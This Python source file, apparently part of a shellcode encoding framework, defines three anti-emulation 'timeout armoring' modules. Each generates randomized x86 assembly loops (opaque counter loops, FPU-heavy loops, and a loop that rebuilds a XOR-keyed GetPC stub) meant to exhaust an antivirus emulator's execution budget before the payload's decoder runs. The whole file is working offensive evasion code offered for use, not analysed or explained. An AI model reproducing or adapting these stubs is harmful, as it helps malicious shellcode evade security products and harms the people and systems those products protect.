#!/usr/bin/python

"""
Timeout armoring using various loops to exceed execution threshold
"""

from struct import unpack
from random import choice, randint
from assembler.assembler import assembler
from evasion_modules.core.core import evasion_module
from evasion_modules.core.getpc import getpc_stub_builder
from arch.core import stackpointer_registers, stackframepointer_registers, arch_registers, bit_packs, word_keywords, acc_regs, ctr_regs, base_regs, src_index_regs, dest_index_regs, fpu_instructions
from utils.rand import rand_bytes

# Anti-emulation armoring using opaque loops to exceed execution threshold
class evasion_timeout_opaque_loop(evasion_module):

	def getpc_stub(self, getpc_reg):
		reg_size = 2**self.bits

		stackpointer_reg = stackpointer_registers[self.bits]
		word_keyword = word_keywords[self.bits]

		regs = arch_registers(self.arch, self.bits)

		acc_reg = acc_regs[self.bits]
		ctr_reg = ctr_regs[self.bits]

		# null instruction
		null_instructions = ['XOR', 'SUB']
		null_instr = choice(null_instructions)

		stub_builder = getpc_stub_builder(self.arch, self.bits, self.badchars)
		plain_getpc_stub = unpack(bit_packs[self.bits], stub_builder.stack_getpc_stub(getpc_reg))[0]

		# arithmetic instruction during loop calculations
		# Can be improved by adding support for various arithmetic instructions
		arith_instr = 'INC'

		outer_loop_size = randint(0xFF, 0xFFF)
		inner_loop_size_0 = randint(0xFFFF, 0x7FFFFF)
		inner_loop_size_1 = randint(0xFFFF, 0x7FFFFF)

		reg1_init = unpack(bit_packs[self.bits], rand_bytes(self.bits/8, self.badchars))[0]
		reg2_init = unpack(bit_packs[self.bits], rand_bytes(self.bits/8, self.badchars))[0]
		reg3_init = unpack(bit_packs[self.bits], rand_bytes(self.bits/8, self.badchars))[0]

		reg2_val = (reg2_init + (inner_loop_size_0 % reg_size)) % reg_size
		reg3_val = (reg3_init + (inner_loop_size_1 % reg_size)) % reg_size
		reg1_val = (reg1_init + (outer_loop_size % reg_size)) % reg_size

		reg1_val ^= reg2_val
		reg1_val ^= reg3_val

		reg1 = regs.random_gp_reg(False, [ctr_reg])
		reg2 = regs.random_gp_reg(False, [ctr_reg, reg1])
		reg3 = regs.random_gp_reg(False, [ctr_reg, reg1, reg2])

		variables = {'ctr_reg': ctr_reg, 'reg1': reg1, 'reg2': reg2, 'reg3': reg3, 'null_instr': null_instr, 'arith_instr': arith_instr, 'outer_loop_size': outer_loop_size, 'inner_loop_size_0': inner_loop_size_0, 'inner_loop_size_1': inner_loop_size_1, 'reg1_val': reg1_val, 'reg2_val': reg2_val, 'reg3_val': reg3_val, 'reg1_init': reg1_init, 'reg2_init': reg2_init, 'reg3_init': reg3_init, 'plain_getpc_stub': plain_getpc_stub, 'stackpointer_reg': stackpointer_reg}

		listing = '''
main:
	MOV {reg1}, {reg1_init}
	MOV {ctr_reg}, {outer_loop_size}

outer_loop:
	PUSH {ctr_reg}

	{arith_instr} {reg1}

	MOV {reg2}, {reg2_init}
	MOV {ctr_reg}, {inner_loop_size_0}

	inner_loop_0:
		{arith_instr} {reg2}
	LOOP inner_loop_0

	CMP {reg2}, {reg2_val}
	JNZ inner_loop_0

	MOV {reg3}, {reg3_init}
	MOV {ctr_reg}, {inner_loop_size_1}

	inner_loop_1:
		{arith_instr} {reg3}
	LOOP inner_loop_1

	CMP {reg3}, {reg3_val}
	JNZ inner_loop_1

	POP {ctr_reg}
LOOP outer_loop

	XOR {reg1}, {reg2}
	XOR {reg1}, {reg3}
	CMP {reg1}, {reg1_val}
	JNZ outer_loop

	PUSH {plain_getpc_stub}
	CALL {stackpointer_reg}
'''

		asm = assembler(self.arch, self.bits)
		stub = asm.assemble(listing.format(**variables))
		return stub

# Anti-emulation armoring using intensive loops to exceed execution threshold
class evasion_timeout_intensive_loop(evasion_module):

	def getpc_stub(self, getpc_reg):
		reg_size = 2**self.bits

		stackpointer_reg = stackpointer_registers[self.bits]

		regs = arch_registers(self.arch, self.bits)

		ctr_reg = ctr_regs[self.bits]

		fpu_stub = ''
		fpu_count = randint(0x04, 0x0F)
		for i in xrange(fpu_count):
			fpu_stub += choice(fpu_instructions)

		loop_size = randint(0x7FFFFF, 0xFFFFFF)

		stub_builder = getpc_stub_builder(self.arch, self.bits, self.badchars)
		plain_getpc_stub = unpack(bit_packs[self.bits], stub_builder.stack_getpc_stub(getpc_reg))[0]

		variables = {'fpu_stub': fpu_stub, 'ctr_reg': ctr_reg, 'loop_size': loop_size, 'plain_getpc_stub': plain_getpc_stub, 'stackpointer_reg': stackpointer_reg}

		listing = '''
main:
	MOV {ctr_reg}, {loop_size}
fpu_loop:
	{fpu_stub}
LOOP fpu_loop
	PUSH {plain_getpc_stub}
	CALL {stackpointer_reg}
'''

		asm = assembler(self.arch, self.bits)
		stub = asm.assemble(listing.format(**variables))
		return stub

# Anti-emulation armoring using integrated loops to exceed execution threshold
class evasion_timeout_integrated_loop(evasion_module):

	def getpc_stub(self, getpc_reg):
		reg_size = 2**self.bits

		stackpointer_reg = stackpointer_registers[self.bits]
		ctr_reg = ctr_regs[self.bits]

		regs = arch_registers(self.arch, self.bits)
		key_reg = regs.random_gp_reg(False, [ctr_reg])
		getpc_stub_reg = regs.random_gp_reg(False, [key_reg, ctr_reg])

		stub_builder = getpc_stub_builder(self.arch, self.bits, self.badchars)
		plain_getpc_stub = unpack(bit_packs[self.bits], stub_builder.stack_getpc_stub(getpc_reg))[0]

		# arithmetic instruction during loop calculations
		# Can be improved by adding support for various arithmetic instructions
		arith_instr = 'INC'

		key_val = unpack(bit_packs[self.bits], rand_bytes(self.bits/8, self.badchars))[0]
		getpc_val = plain_getpc_stub ^ key_val

		getpc_stub_reg_init = unpack(bit_packs[self.bits], rand_bytes(self.bits/8, self.badchars))[0]
		key_reg_init = unpack(bit_packs[self.bits], rand_bytes(self.bits/8, self.badchars))[0]

		getpc_building_loop_size = (getpc_val - getpc_stub_reg_init) % reg_size
		key_building_loop_size = (key_val - key_reg_init) % reg_size

		variables = {'key_reg': key_reg, 'ctr_reg': ctr_reg, 'key_reg_init': key_reg_init, 'key_building_loop_size': key_building_loop_size, 'arith_instr': arith_instr, 'getpc_stub_reg': getpc_stub_reg, 'getpc_stub_reg_init': getpc_stub_reg_init, 'getpc_building_loop_size': getpc_building_loop_size, 'stackpointer_reg': stackpointer_reg}

		listing = '''
main:

MOV {key_reg}, {key_reg_init}
MOV {ctr_reg}, {key_building_loop_size}

key_building_loop:
	{arith_instr} {key_reg}
LOOP key_building_loop

MOV {getpc_stub_reg}, {getpc_stub_reg_init}
MOV {ctr_reg}, {getpc_building_loop_size}

getpc_building_loop:
	{arith_instr} {getpc_stub_reg}
LOOP getpc_building_loop

XOR {getpc_stub_reg}, {key_reg}
PUSH {getpc_stub_reg}
CALL {stackpointer_reg}
'''

		asm = assembler(self.arch, self.bits)
		stub = asm.assemble(listing.format(**variables))
		return stub